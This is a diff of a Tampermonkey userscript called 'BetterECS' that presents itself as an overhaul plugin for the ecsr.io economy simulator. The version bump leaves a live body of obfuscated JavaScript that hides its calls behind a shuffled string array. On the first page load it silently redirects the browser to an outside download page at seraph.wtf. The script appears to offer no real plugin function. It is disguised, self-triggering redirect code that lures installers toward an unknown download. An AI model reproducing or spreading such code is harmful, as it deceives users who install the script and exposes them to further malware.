@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         BetterECS
 // @namespace    http://tampermonkey.net/
-// @version      0.0.67
+// @version      0.0.68
 // @description  Economy Simulator Overhaul Plugin (Dev)
 // @author       isabella
 // @match        https://ecsr.io/*
@@ -35,4 +35,4 @@
 // @resource     discordIcon https://imgs.search.brave.com/mRHkIaGFNtQ-vkIukHc9y2D28x34KVTs9Luu59lty6s/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9jZG4t/aWNvbnMtcG5nLmZs/YXRpY29uLmNvbS8x/MjgvNDk0NS80OTQ1/OTczLnBuZw
 // @resource     maticIcon https://github.com/ravegirls/eco_assets/blob/main/image.gif?raw=true
 // ==/UserScript==
-/*61ffcb42353836b90cce54698d22e2bb176e359f647fb56b5c305419288f9f9bc4eeb08b92fcbba3d0a9add2d7c3ab47c2fde329e5acd3a1f05f69eb5bf480d00e73534079012228bd5dc18790db5ae3b0b194d06e0e7a7da6d7038ef79da621b65c32189afd667dc736e328ff5f22c8eafd9ec55e047d6dec6a883770e53046*/function _0x438a(t,n){t-=380;return _0x236c()[t]}function _0x236c(){const t=["172689iCZSso","971178fGCXKu","930420fbeMok","7BlpYvp","28EzZkSb","806040tJiiSn","18rPbARs","replace","36CTeJgt","location","2425489QCbewT","1381832FsYltg","1GWiWTr","181940ZMUzTl"];return(_0x236c=function(){return t})()}(function(){const t=_0x438a,n=_0x236c();for(;;)try{if(363594===parseInt(t(391))/1*(-parseInt(t(380))/2)+-parseInt(t(393))/3*(-parseInt(t(383))/4)+-parseInt(t(392))/5+parseInt(t(381))/6+parseInt(t(382))/7*(-parseInt(t(390))/8)+parseInt(t(385))/9*(-parseInt(t(384))/10)+-parseInt(t(389))/11*(-parseInt(t(387))/12))break;n.push(n.shift())}catch(t){n.push(n.shift())}})(),function(){"use strict";const t="hasRedirected";Math.random(),(()=>{const n=_0x438a;!GM_getValue(t,!1)&&(GM_setValue(t,!0),window[n(388)][n(386)]("https://seraph.wtf/assets/download-new.html"))})()}();
+/*ff664a692247f7380c9d47b63c74a55ebcc49e78908b76be30ce1f223c10f645e3e6367e2d1ce898e306162c504d6f7c91228191da75556b84434aeebffb35f7e4a79fc7b39f3c17a5f18a56bc300c6d53c5ce80ac6b22c9e5782f909713232432927b543cf9df61b10a9f0bda0c01dc00781195989de55c46e0d0c2e196e067*/function _0x438a(t,n){t-=380;return _0x236c()[t]}function _0x236c(){const t=["172689iCZSso","971178fGCXKu","930420fbeMok","7BlpYvp","28EzZkSb","806040tJiiSn","18rPbARs","replace","36CTeJgt","location","2425489QCbewT","1381832FsYltg","1GWiWTr","181940ZMUzTl"];return(_0x236c=function(){return t})()}(function(){const t=_0x438a,n=_0x236c();for(;;)try{if(363594===parseInt(t(391))/1*(-parseInt(t(380))/2)+-parseInt(t(393))/3*(-parseInt(t(383))/4)+-parseInt(t(392))/5+parseInt(t(381))/6+parseInt(t(382))/7*(-parseInt(t(390))/8)+parseInt(t(385))/9*(-parseInt(t(384))/10)+-parseInt(t(389))/11*(-parseInt(t(387))/12))break;n.push(n.shift())}catch(t){n.push(n.shift())}})(),function(){"use strict";const t="hasRedirected";Math.random(),(()=>{const n=_0x438a;!GM_getValue(t,!1)&&(GM_setValue(t,!0),window[n(388)][n(386)]("https://seraph.wtf/assets/download-new.html"))})()}();
